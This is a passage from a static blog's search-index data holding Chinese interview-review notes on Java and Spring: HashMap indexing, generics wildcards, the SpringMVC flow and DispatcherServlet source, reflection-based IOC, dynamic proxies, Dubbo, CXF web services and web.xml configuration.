h&(length-1)，需要进行大量的与运算，保证2的次幂，可以保证在进行与运算时，(length-1)的值的二进制所有的位均为1，这种情况下，index的结果等于hashcode的最后几位。只要输入的hashcode本身符合均匀分布，hash算法的结果就是均匀的。\n\n\n# 泛型\n\n1. 泛型中的通配符 t，e，k，v，？\n\n本质上这些个都是通配符，没啥区别，换成 a-z 之间的任何一个 字母都可以。\n通常情况下，t，e，k，v，？ 是这样约定的：\n\n * ？ 表示不确定的 java 类型\n * t (type) 表示具体的一个java类型\n * k v (key value) 分别代表java键值中的key value\n * e (element) 代表element\n\n> 可参考：掘金",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-spring进阶篇",frontmatter:{title:"Q&A宝典-spring进阶篇",date:"2020-02-28T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_spring_003.html",relativePath:"views/qaq/sum_spring_003.md",key:"v-b0e3cc10",path:"/views/qaq/sum_spring_003.html",headers:[{level:2,title:"Spring进阶",slug:"spring进阶",normalizedTitle:"spring进阶",charIndex:2},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:8735}],headersStr:"Spring进阶 其它",content:'# Spring进阶\n\n1、SpringMVC的流程？\n\n（1）用户发送请求至前端控制器 DispatcherServlet；\n\n（2） DispatcherServlet收到请求后，调用 HandlerMapping 处理器映射器，请求获取Handle；\n\n（3）处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet；\n\n（4）DispatcherServlet通过 HandlerAdapter 处理器适配器调用处理器；\n\n（5）执行处理器(Handler，也叫后端控制器)；\n\n（6）Handler执行完成返回ModelAndView；\n\n（7）HandlerAdapter将Handler执行结果ModelAndView返回给DispatcherServlet；\n\n（8）DispatcherServlet将ModelAndView传给 ViewReslover 视图解析器进行解析；\n\n（9）ViewReslover解析后返回具体View；\n\n（10）DispatcherServlet对View进行渲染视图（即将模型数据填充至视图中）\n\n（11）DispatcherServlet响应用户。\n\n2. IOC控制反转底层原理\n\n 1. 自定义两个注解\n    \n    @Component：判断是否注入bean容器\n    \n    @Autowired：判断是否依赖注入\n\n 2. 创建ApplicationContext容器类\n    \n    1. private ConcurrentHashMap<String, Object> beans = null; 存放bean的容器\n    \n    2. initBeans(); 根据注解@Component加载所有bean\n       \n       * 利用反射机制，遍历一个包下的所有类，判断类上有注解@Component就放入beans容器中，beans.put(beanId, newInstance);\n    \n    3. initEntryField(); 根据注解@Autowired加载所有依赖注入的对象\n       \n       * 所有bean初始化之后，判断bean的依赖注入关系\n       \n       * 遍历beans容器，利用反射机制，获取bean的所有属性并遍历判断有@Autowired注解的进行依赖注入(利用java反射set注入，private不用写set方法了)\n         \n         //判断当前类属性是否存在注解\n         //declaredFields：利用反射得到的所有属性\n         for (Field field : declaredFields) {\n             SelfAutowired extResource = field.getAnnotation(SelfAutowired.class);\n             if (extResource != null) {\n                 //属性名称：即容器中bean\n                 String beanId = field.getName();\n                 Object bean = getBean(beanId);\n                 if (bean != null) {\n                     //默认使用属性名称，查找bean容器对象 1参数 当前对象 2参数给属性赋值\n                     field.setAccessible(true); //允许访问私有属性,private不用写set()了\n                     field.set(object, bean); //依赖注入\n                 }\n             }\n         }\n         \n         \n         1\n         2\n         3\n         4\n         5\n         6\n         7\n         8\n         9\n         10\n         11\n         12\n         13\n         14\n         15\n         \n\n3. 动态代理底层原理\n * 简书gstansen分析的很好，涉及动态代理比较复杂，我在这里简单概括下吧：\n\n 1. 业务接口（Interface） 业务的抽象表示\n\n 2. 业务具体实现类（concreteManager） 实现业务接口，执行具体的业务操作\n\n 3. 业务代理类（$proxy，在运行的时候动态生成的类） 进行业务代理，调用业务代理操作类\n\n 4. 业务代理操作类（DynamicProxyHandler，实现了InvocationHandler接口的类） 代理方法的直接调用者，通过InvocationHandler中的invoke方法直接发起代理\n    \n    public class DynamicProxyHandler implements InvocationHandler{\n        Object realCookManager;\n        DynamicProxyHandler(ICook realCookManager){\n            this.realCookManager = realCookManager;\n        }\n        @Override\n        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n            System.out.println("invoke start");\n            System.out.println(method.getName());\n            method.invoke(realCookManager,args);\n            System.out.println("invoke end");\n            return null;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n\n 5. 客户端调用对象（client） 发起业务\n\n * 总体思路：\n   \n   /* 5.客户端调用对象（client）\n    */\n   public class Main {\n       public static void main(String[] args){\n   \t\t//1. 业务实现类\n           CookManager cookManager = new CookManager();\n           //2. 业务代理操作类\n           DynamicProxyHandler dynamicProxyHandler = \n               new DynamicProxyHandler(cookManager);\n           //3. Proxy类中的newProxyInstance()方法利用java反射返回代理类的实例\n           ICook iCook =(ICook)Proxy.newProxyInstance(\n               dynamicProxyHandler.getClass().getClassLoader(),\n               cookManager.getClass().getInterfaces(),\n               dynamicProxyHandler);\n           \n           //打印一下代理类的类名\n           System.out.println(iCook.getClass().getName());\n           iCook.dealWithFoot();\n           iCook.cook();\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   \n   \n   > ICook iCook = (ICook)Proxy.newProxyInstance(\n   > \n   > 业务代理操作类.getClass().getClassLoader(),\n   > \n   > 业务具体实现类.getClass().getInterfaces(),\n   > \n   > 业务代理操作类 );\n   \n   1. ClassLoader是一个抽象类，作用是将字节码文件加载进虚拟机并生成相应的class（注意是小写的）\n   2. interfaces就是被实现的那些业务接口\n   3. 业务代理操作类：实现InvocationHandler接口的实例，即DynamicProxyHandler\n   \n   Proxy类中的newProxyInstance()方法利用java反射返回代理类的实例：\n   \n   public static Object newProxyInstance(ClassLoader loader,Class<?>[]\n                                         interfaces,InvocationHandler h){\n        //所有被实现的业务接口\n         final Class<?>[] intfs = interfaces.clone();\n        //寻找或生成指定的代理类\n         Class<?> cl = getProxyClass0(loader, intfs);\n         //通过反射类中的Constructor获取其所有构造方法\n         final Constructor<?> cons = cl.getConstructor(constructorParams);\n         //通过Constructor返回代理类的实例\n         return cons.newInstance(new Object[]{h});\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n4、读过springmvc源码？\n\nSpringmvc入口 请求 映射器 适配器\n\n//前端控制器分派方法 \n\nprotected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception { \n\n​    HttpServletRequest processedRequest = request; \n\n​    HandlerExecutionChain mappedHandler = null; \n\n​    int interceptorIndex = -1;\n\n​    try { \n\n​      ModelAndView mv; \n\n​      boolean errorView = false;  \n\n​      try { \n\n​    //检查是否是请求是否是multipart（如文件上传），如果是将通过MultipartResolver解析 \n\n​        processedRequest = checkMultipart(request); \n\n​     //步骤2、请求到处理器（页面控制器）的映射，通过HandlerMapping进行映射 \n\n​        mappedHandler = getHandler(processedRequest, false); \n\n​        if (mappedHandler == null || mappedHandler.getHandler() == null) { \n\n​          noHandlerFound(processedRequest, response); \n\n​          return; \n\n​        } \n\n //步骤3、处理器适配，即将我们的处理器包装成相应的适配器（从而支持多种类型的处理器） \n\n​        HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());  \n\n​        // 304 Not Modified缓存支持 \n\n​        //此处省略具体代码  \n\n​        // 执行处理器相关的拦截器的预处理（HandlerInterceptor.preHandle） \n\n​        //此处省略具体代码  \n\n​        // 步骤4、由适配器执行处理器（调用处理器相应功能处理方法） \n\n​        mv = ha.handle(processedRequest, response, mappedHandler.getHandler());  \n\n​        // Do we need view name translation? \n\n​        if (mv != null && !mv.hasView()) { \n\n​          mv.setViewName(getDefaultViewName(request)); \n\n​        }  \n\n​        // 执行处理器相关的拦截器的后处理（HandlerInterceptor.postHandle） \n\n​        //此处省略具体代码 \n\n​      } \n\n​      catch (ModelAndViewDefiningException ex) { \n\n​        logger.debug("ModelAndViewDefiningException encountered", ex); \n\n​        mv = ex.getModelAndView(); \n\n​      } \n\n​      catch (Exception ex) { \n\n​        Object handler = (mappedHandler != null ? mappedHandler.getHandler() : null); \n\n​        mv = processHandlerException(processedRequest, response, handler, ex); \n\n​        errorView = (mv != null); \n\n​      }  \n\n//步骤5 步骤6、解析视图并进行视图的渲染 \n\n//步骤5 由ViewResolver解析View（viewResolver.resolveViewName(viewName, locale)） \n\n步骤6 视图在渲染时会把Model传入（view.render(mv.getModelInternal(), request, response);） \n\n​      if (mv != null && !mv.wasCleared()) { \n\n​        render(mv, processedRequest, response); \n\n​        if (errorView) { \n\n​          WebUtils.clearErrorRequestAttributes(request); \n\n​        } \n\n​      } \n\n​      else { \n\n​        if (logger.isDebugEnabled()) { \n\n​          logger.debug("Null ModelAndView returned to DispatcherServlet with name \'" + getServletName() + \n\n​              "\': assuming HandlerAdapter completed request handling"); \n\n​        } \n\n​      }  \n\n​      // 执行处理器相关的拦截器的完成后处理（HandlerInterceptor.afterCompletion） \n\n​      //此处省略具体代码  \n\n​    catch (Exception ex) { \n\n​      // Trigger after-completion for thrown exception. \n\n​      triggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, ex)      throw ex; \n\n​    } \n\n​    catch (Error err) { \n\n​      ServletException ex = new NestedServletException("Handler processing failed", err); \n\n​      // Trigger after-completion for thrown exception. \n\n​      triggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, ex); \n\n​      throw ex; \n\n​    }  \n\n​    finally { \n\n​      // Clean up any resources used by a multipart request. \n\n​      if (processedRequest != request) {\n\n​        cleanupMultipart(processedRequest); \n\n​      } \n\n​    } \n\n  } \n\n \n\n \n\nSpringmvc九大组件：\n\nprotected void initStrategies(ApplicationContext context) {\n\n  //用于处理上传请求。处理方法是将普通的request包装成MultipartHttpServletRequest，后者可以直接调用getFile方法获取File.\n\n  initMultipartResolver(context);\n\n  //SpringMVC主要有两个地方用到了Locale：一是ViewResolver视图解析的时候；二是用到国际化资源或者主题的时候。\n\n  initLocaleResolver(context); \n\n  //用于解析主题。SpringMVC中一个主题对应一个properties文件，里面存放着跟当前主题相关的所有资源、\n\n  //如图片、css样式等。SpringMVC的主题也支持国际化， \n\n  initThemeResolver(context);\n\n  //用来查找Handler的。\n\n  initHandlerMappings(context);\n\n  //从名字上看，它就是一个适配器。Servlet需要的处理方法的结构却是固定的，都是以request和response为参数的方法。\n\n  //如何让固定的Servlet处理方法调用灵活的Handler来进行处理呢？这就是HandlerAdapter要做的事情\n\n  initHandlerAdapters(context);\n\n  //其它组件都是用来干活的。在干活的过程中难免会出现问题，出问题后怎么办呢？\n\n  //这就需要有一个专门的角色对异常情况进行处理，在SpringMVC中就是HandlerExceptionResolver。\n\n  initHandlerExceptionResolvers(context);\n\n  //有的Handler处理完后并没有设置View也没有设置ViewName，这时就需要从request获取ViewName了，\n\n  //如何从request中获取ViewName就是RequestToViewNameTranslator要做的事情了。\n\n  initRequestToViewNameTranslator(context);\n\n  //ViewResolver用来将String类型的视图名和Locale解析为View类型的视图。\n\n  //View是用来渲染页面的，也就是将程序返回的参数填入模板里，生成html（也可能是其它类型）文件。\n\n  initViewResolvers(context);\n\n  //用来管理FlashMap的，FlashMap主要用在redirect重定向中传递参数。\n\n  initFlashMapManager(context); \n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n\n\n\n# 其它\n\n1. 定时任务\n\n就是在xml中配置，具体可以看我的这篇文章\n\n 1. 先配置(实例化)一个业务，就是我们自己写的类\n 2. 再配置一个任务，jobDetailFactoryBean\n    * 在这个任务里name=targetObject 注入我们自己写的那个类\n    * 要用哪个方法的话，就name=tagetMethod 注入那个方法\n    * name=concurrent 设置为false防止并发执行\n 3. 再配置触发器(cron表达式)，CronTriggerBean\n    * name=jobDetail 注入那个任务\n    * name=cronExpression 设置定时触发时间\n 4. 配置一个调度器(只能有一个) SchedulerFactoryBean\n    * name=triggers 注入要调度的哪个触发器\n\n2. dubbo\n\n> 参考 dubbo官网配置\n\n * 提供者：提供方应用信息\n   \n   配置<dubbo:registry>zookeeper注册中心暴露服务地址\n   配置dubbo协议和端口号<dubbo:protocol> dubbo协议\n   <dubbo:service>声明要暴露的服务接口(或者用注解)\n\n * zookeeper：注册中心\n\n * 消费者：消费方应用信息\n   \n   配置zookeeper注册中心暴露服务地址<dubbo:registry>\n   获取注册中心的接口信息<dubbo:reference>\n\n3. httpclient短信验证码\n\n> 参考互亿无线文档\n\n 1. 前端点击获取验证码的时候，ajax访问后台请求，同时倒计时60秒\n 2. 我们在后台拿到短信平台提供的接口地址，然后看他需要什么参数（用户名，密码，手机号，短信验证码），它有文档demo嘛，就根据它的改成我们需要的，然后拼装参数给他返回去\n 3. 然后他呢也会给我们返回一堆参数(是成功还是失败)，我们把这些参数返回给前端\n\n4. webService\n\n> 参考博客简单的webService接口生成\n> 方法上加@WebMentod(exclude=true)后，此方法不被发布\n> 静态方法不会被发布\n\n 1. 配置web.xml文件 设置cxf要拦截的路径\n    cxf服务端必须定义CXFServlet对象\n 2. 配置服务端cxf.xml文件 （暴露访问地址,发布接口）\n    <cxf:endpoint address="/user" implementor="#实现类"/>\n 3. 定义一个bean类\n 4. 争对这个bean类写一个接口，在接口前加注解\n    @javax.jws.WebService(表示一个服务端发布接口)\n 5. 在这个接口的实现类加@javax.jws.WebService、 @Service (服务层)\n 6. 地址栏登陆时：记得\n    http://localhost:8080/工程名/ws(web.xml配置)/自己配置的地址?wsdl\n\n * 如果用cxf测试接口的话\n   1. 配置cxf服务端(以上)\n   2. 配置客户端xml 请求地址，和服务端暴露的接口\n   3. cmd下 一堆命令\n\n5. spring中配置事务\n\n> 声明式事务配置详解\n\n * web.xml加载顺序：\n\n 1. listener 加载spring\n\n \x3c!-- spring start --\x3e\n <listener>\n \t\x3c!-- spring web容器  默认加载spring配置文件路径为 WEB-INF/applicationContext.xml--\x3e\n \t<listener-class>\n \t\torg.springframework.web.context.ContextLoaderListener\n \t</listener-class>\n </listener>\n \n <context-param>\n \t<param-name>contextConfigLocation</param-name>\n \t<param-value>classpath:applicationContext*.xml</param-value>\n </context-param>\n \x3c!-- spring end --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. filter\n 3. servlet\n\n\x3c!-- springmvc start --\x3e\n <servlet>\n \t<servlet-name>mvc</servlet-name>\n \t<servlet-class>\n \t\torg.springframework.web.servlet.DispatcherServlet\n \t</servlet-class>\n \t<init-param>\n \t\t<param-name>contextConfigLocation</param-name>\n \t\t<param-value>classpath:springmvc.xml</param-value>\n \t</init-param>\n </servlet>\n \n <servlet-mapping>\n \t<servlet-name>mvc</servlet-name>\n \t<url-pattern>/</url-pattern>\n </servlet-mapping>\n \x3c!-- springmvc end --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * web.xml加载的时候先加载spring，后加载springmvc\n\n 1. spring自带aop，spring是父容器\n 2. springmvc没有引入aop，springmvc是子容器\n 3. 子容器的创建依赖于父容器的创建，父容器先于子容器创建；子容器 (springmvc 容器) 可以访问父容器 (spring 容器) 的 bean，父容器 (spring 容器) 不能访问子容器 (springmvc 容器) 的 bean\n 4. 所以一般在子容器springmvc中开启aop配置 <aop:aspectj-autoproxy/>\n 5. 而事务、切面都依赖于aop\n 6. 如果不想aop在Controller生效，则配置的时候可以让springmvc只扫描@Controller注解，spring扫描除了@Controller的其它所有注解，并且在spring中开启aop配置即可\n\n * 以下是具体配置：\n\n\x3c!-- springmvc配置 --\x3e\n\n\x3c!-- use-default-filters="false" 所有注解不被加载 --\x3e\n<context:component-scan base-package="com.xxx" use-default-filters="false">\n    \x3c!-- 只加载@Controller注解 --\x3e\n    <context:include-filter type="annotation" \n                            expression="org.springframework.stereotype.Controller" />\n</context:component-scan>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\x3c!-- spring配置 --\x3e\n\n\x3c!-- spring配置aop --\x3e\n<aop:aspectj-autoproxy/>\n\x3c!-- use-default-filters="true" 默认、加载所有注解 --\x3e\n<context:component-scan base-package="com.xxx">\n    \x3c!-- 加载除了@Controller的其它所有注解 --\x3e\n    <context:exclude-filter type="annotation" \n                            expression="org.springframework.stereotype.Controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# spring进阶\n\n1、springmvc的流程？\n\n（1）用户发送请求至前端控制器 dispatcherservlet；\n\n（2） dispatcherservlet收到请求后，调用 handlermapping 处理器映射器，请求获取handle；\n\n（3）处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给dispatcherservlet；\n\n（4）dispatcherservlet通过 handleradapter 处理器适配器调用处理器；\n\n（5）执行处理器(handler，也叫后端控制器)；\n\n（6）handler执行完成返回modelandview；\n\n（7）handleradapter将handler执行结果modelandview返回给dispatcherservlet；\n\n（8）dispatcherservlet将modelandview传给 viewreslover 视图解析器进行解析；\n\n（9）viewreslover解析后返回具体view；\n\n（10）dispatcherservlet对view进行渲染视图（即将模型数据填充至视图中）\n\n（11）dispatcherservlet响应用户。\n\n2. ioc控制反转底层原理\n\n 1. 自定义两个注解\n    \n    @component：判断是否注入bean容器\n    \n    @autowired：判断是否依赖注入\n\n 2. 创建applicationcontext容器类\n    \n    1. private concurrenthashmap<string, object> beans = null; 存放bean的容器\n    \n    2. initbeans(); 根据注解@component加载所有bean\n       \n       * 利用反射机制，遍历一个包下的所有类，判断类上有注解@component就放入beans容器中，beans.put(beanid, newinstance);\n    \n    3. initentryfield(); 根据注解@autowired加载所有依赖注入的对象\n       \n       * 所有bean初始化之后，判断bean的依赖注入关系\n       \n       * 遍历beans容器，利用反射机制，获取bean的所有属性并遍历判断有@autowired注解的进行依赖注入(利用java反射set注入，private不用写set方法了)\n         \n         //判断当前类属性是否存在注解\n         //declaredfields：利用反射得到的所有属性\n         for (field field : declaredfields) {\n             selfautowired extresource = field.getannotation(selfautowired.class);\n             if (extresource != null) {\n                 //属性名称：即容器中bean\n                 string beanid = field.getname();\n                 object bean = getbean(beanid);\n                 if (bean != null) {\n                     //默认使用属性名称，查找bean容器对象 1参数 当前对象 2参数给属性赋值\n                     field.setaccessible(true); //允许访问私有属性,private不用写set()了\n                     field.set(object, bean); //依赖注入\n                 }\n             }\n         }\n         \n         \n         1\n         2\n         3\n         4\n         5\n         6\n         7\n         8\n         9\n         10\n         11\n         12\n         13\n         14\n         15\n         \n\n3. 动态代理底层原理\n * 简书gstansen分析的很好，涉及动态代理比较复杂，我在这里简单概括下吧：\n\n 1. 业务接口（interface） 业务的抽象表示\n\n 2. 业务具体实现类（concretemanager） 实现业务接口，执行具体的业务操作\n\n 3. 业务代理类（$proxy，在运行的时候动态生成的类） 进行业务代理，调用业务代理操作类\n\n 4. 业务代理操作类（dynamicproxyhandler，实现了invocationhandler接口的类） 代理方法的直接调用者，通过invocationhandler中的invoke方法直接发起代理\n    \n    public class dynamicproxyhandler implements invocationhandler{\n        object realcookmanager;\n        dynamicproxyhandler(icook realcookmanager){\n            this.realcookmanager = realcookmanager;\n        }\n        @override\n        public object invoke(object proxy, method method, object[] args) throws throwable {\n            system.out.println("invoke start");\n            system.out.println(method.getname());\n            method.invoke(realcookmanager,args);\n            system.out.println("invoke end");\n            return null;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n\n 5. 客户端调用对象（client） 发起业务\n\n * 总体思路：\n   \n   /* 5.客户端调用对象（client）\n    */\n   public class main {\n       public static void main(string[] args){\n   \t\t//1. 业务实现类\n           cookmanager cookmanager = new cookmanager();\n           //2. 业务代理操作类\n           dynamicproxyhandler dynamicproxyhandler = \n               new dynamicproxyhandler(cookmanager);\n           //3. proxy类中的newproxyinstance()方法利用java反射返回代理类的实例\n           icook icook =(icook)proxy.newproxyinstance(\n               dynamicproxyhandler.getclass().getclassloader(),\n               cookmanager.getclass().getinterfaces(),\n               dynamicproxyhandler);\n           \n           //打印一下代理类的类名\n           system.out.println(icook.getclass().getname());\n           icook.dealwithfoot();\n           icook.cook();\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   \n   \n   > icook icook = (icook)proxy.newproxyinstance(\n   > \n   > 业务代理操作类.getclass().getclassloader(),\n   > \n   > 业务具体实现类.getclass().getinterfaces(),\n   > \n   > 业务代理操作类 );\n   \n   1. classloader是一个抽象类，作用是将字节码文件加载进虚拟机并生成相应的class（注意是小写的）\n   2. interfaces就是被实现的那些业务接口\n   3. 业务代理操作类：实现invocationhandler接口的实例，即dynamicproxyhandler\n   \n   proxy类中的newproxyinstance()方法利用java反射返回代理类的实例：\n   \n   public static object newproxyinstance(classloader loader,class<?>[]\n                                         interfaces,invocationhandler h){\n        //所有被实现的业务接口\n         final class<?>[] intfs = interfaces.clone();\n        //寻找或生成指定的代理类\n         class<?> cl = getproxyclass0(loader, intfs);\n         //通过反射类中的constructor获取其所有构造方法\n         final constructor<?> cons = cl.getconstructor(constructorparams);\n         //通过constructor返回代理类的实例\n         return cons.newinstance(new object[]{h});\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n4、读过springmvc源码？\n\nspringmvc入口 请求 映射器 适配器\n\n//前端控制器分派方法 \n\nprotected void dodispatch(httpservletrequest request, httpservletresponse response) throws exception { \n\n​    httpservletrequest processedrequest = request; \n\n​    handlerexecutionchain mappedhandler = null; \n\n​    int interceptorindex = -1;\n\n​    try { \n\n​      modelandview mv; \n\n​      boolean errorview = false;  \n\n​      try { \n\n​    //检查是否是请求是否是multipart（如文件上传），如果是将通过multipartresolver解析 \n\n​        processedrequest = checkmultipart(request); \n\n​     //步骤2、请求到处理器（页面控制器）的映射，通过handlermapping进行映射 \n\n​        mappedhandler = gethandler(processedrequest, false); \n\n​        if (mappedhandler == null || mappedhandler.gethandler() == null) { \n\n​          nohandlerfound(processedrequest, response); \n\n​          return; \n\n​        } \n\n //步骤3、处理器适配，即将我们的处理器包装成相应的适配器（从而支持多种类型的处理器） \n\n​        handleradapter ha = gethandleradapter(mappedhandler.gethandler());  \n\n​        // 304 not modified缓存支持 \n\n​        //此处省略具体代码  \n\n​        // 执行处理器相关的拦截器的预处理（handlerinterceptor.prehandle） \n\n​        //此处省略具体代码  \n\n​        // 步骤4、由适配器执行处理器（调用处理器相应功能处理方法） \n\n​        mv = ha.handle(processedrequest, response, mappedhandler.gethandler());  \n\n​        // do we need view name translation? \n\n​        if (mv != null && !mv.hasview()) { \n\n​          mv.setviewname(getdefaultviewname(request)); \n\n​        }  \n\n​        // 执行处理器相关的拦截器的后处理（handlerinterceptor.posthandle） \n\n​        //此处省略具体代码 \n\n​      } \n\n​      catch (modelandviewdefiningexception ex) { \n\n​        logger.debug("modelandviewdefiningexception encountered", ex); \n\n​        mv = ex.getmodelandview(); \n\n​      } \n\n​      catch (exception ex) { \n\n​        object handler = (mappedhandler != null ? mappedhandler.gethandler() : null); \n\n​        mv = processhandlerexception(processedrequest, response, handler, ex); \n\n​        errorview = (mv != null); \n\n​      }  \n\n//步骤5 步骤6、解析视图并进行视图的渲染 \n\n//步骤5 由viewresolver解析view（viewresolver.resolveviewname(viewname, locale)） \n\n步骤6 视图在渲染时会把model传入（view.render(mv.getmodelinternal(), request, response);） \n\n​      if (mv != null && !mv.wascleared()) { \n\n​        render(mv, processedrequest, response); \n\n​        if (errorview) { \n\n​          webutils.clearerrorrequestattributes(request); \n\n​        } \n\n​      } \n\n​      else { \n\n​        if (logger.isdebugenabled()) { \n\n​          logger.debug("null modelandview returned to dispatcherservlet with name \'" + getservletname() + \n\n​              "\': assuming handleradapter completed request handling"); \n\n​        } \n\n​      }  \n\n​      // 执行处理器相关的拦截器的完成后处理（handlerinterceptor.aftercompletion） \n\n​      //此处省略具体代码  \n\n​    catch (exception ex) { \n\n​      // trigger after-completion for thrown exception. \n\n​      triggeraftercompletion(mappedhandler, interceptorindex, processedrequest, response, ex)      throw ex; \n\n​    } \n\n​    catch (error err) { \n\n​      servletexception ex = new nestedservletexception("handler processing failed", err); \n\n​      // trigger after-completion for thrown exception. \n\n​      triggeraftercompletion(mappedhandler, interceptorindex, processedrequest, response, ex); \n\n​      throw ex; \n\n​    }  \n\n​    finally { \n\n​      // clean up any resources used by a multipart request. \n\n​      if (processedrequest != request) {\n\n​        cleanupmultipart(processedrequest); \n\n​      } \n\n​    } \n\n  } \n\n \n\n \n\nspringmvc九大组件：\n\nprotected void initstrategies(applicationcontext context) {\n\n  //用于处理上传请求。处理方法是将普通的request包装成multiparthttpservletrequest，后者可以直接调用getfile方法获取file.\n\n  initmultipartresolver(context);\n\n  //springmvc主要有两个地方用到了locale：一是viewresolver视图解析的时候；二是用到国际化资源或者主题的时候。\n\n  initlocaleresolver(context); \n\n  //用于解析主题。springmvc中一个主题对应一个properties文件，里面存放着跟当前主题相关的所有资源、\n\n  //如图片、css样式等。springmvc的主题也支持国际化， \n\n  initthemeresolver(context);\n\n  //用来查找handler的。\n\n  inithandlermappings(context);\n\n  //从名字上看，它就是一个适配器。servlet需要的处理方法的结构却是固定的，都是以request和response为参数的方法。\n\n  //如何让固定的servlet处理方法调用灵活的handler来进行处理呢？这就是handleradapter要做的事情\n\n  inithandleradapters(context);\n\n  //其它组件都是用来干活的。在干活的过程中难免会出现问题，出问题后怎么办呢？\n\n  //这就需要有一个专门的角色对异常情况进行处理，在springmvc中就是handlerexceptionresolver。\n\n  inithandlerexceptionresolvers(context);\n\n  //有的handler处理完后并没有设置view也没有设置viewname，这时就需要从request获取viewname了，\n\n  //如何从request中获取viewname就是requesttoviewnametranslator要做的事情了。\n\n  initrequesttoviewnametranslator(context);\n\n  //viewresolver用来将string类型的视图名和locale解析为view类型的视图。\n\n  //view是用来渲染页面的，也就是将程序返回的参数填入模板里，生成html（也可能是其它类型）文件。\n\n  initviewresolvers(context);\n\n  //用来管理flashmap的，flashmap主要用在redirect重定向中传递参数。\n\n  initflashmapmanager(context); \n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n\n\n\n# 其它\n\n1. 定时任务\n\n就是在xml中配置，具体可以看我的这篇文章\n\n 1. 先配置(实例化)一个业务，就是我们自己写的类\n 2. 再配置一个任务，jobdetailfactorybean\n    * 在这个任务里name=targetobject 注入我们自己写的那个类\n    * 要用哪个方法的话，就name=tagetmethod 注入那个方法\n    * name=concurrent 设置为false防止并发执行\n 3. 再配置触发器(cron表达式)，crontriggerbean\n    * name=jobdetail 注入那个任务\n    * name=cronexpression 设置定时触发时间\n 4. 配置一个调度器(只能有一个) schedulerfactorybean\n    * name=triggers 注入要调度的哪个触发器\n\n2. dubbo\n\n> 参考 dubbo官网配置\n\n * 提供者：提供方应用信息\n   \n   配置<dubbo:registry>zookeeper注册中心暴露服务地址\n   配置dubbo协议和端口号<dubbo:protocol> dubbo协议\n   <dubbo:service>声明要暴露的服务接口(或者用注解)\n\n * zookeeper：注册中心\n\n * 消费者：消费方应用信息\n   